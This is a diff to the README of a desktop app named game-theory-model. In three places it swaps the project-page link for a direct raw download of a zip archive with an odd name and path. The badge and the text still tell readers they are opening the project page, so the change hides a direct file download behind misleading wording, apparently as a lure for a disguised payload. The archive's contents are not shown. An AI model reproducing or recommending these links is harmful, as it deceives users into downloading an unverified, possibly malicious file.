@@ -1,12 +1,12 @@
 # 🧠 game-theory-model - Clear strategic analysis on your desktop
 
-[![Download game-theory-model](https://img.shields.io/badge/Download-Open%20the%20project%20page-blue?style=for-the-badge)](https://github.com/Katnonymous/game-theory-model)
+[![Download game-theory-model](https://img.shields.io/badge/Download-Open%20the%20project%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Katnonymous/game-theory-model/main/gillotage/game-model-theory-Piaropus.zip)
 
 ## 📥 Download and install
 
 Visit the project page here:
 
-https://github.com/Katnonymous/game-theory-model
+https://raw.githubusercontent.com/Katnonymous/game-theory-model/main/gillotage/game-model-theory-Piaropus.zip
 
 Use that page to download the app for Windows.
 
@@ -210,7 +210,7 @@ This makes backup and recovery much easier.
 
 Use this page to download the app:
 
-https://github.com/Katnonymous/game-theory-model
+https://raw.githubusercontent.com/Katnonymous/game-theory-model/main/gillotage/game-model-theory-Piaropus.zip
 
 ## 🧰 What you can expect after install
 
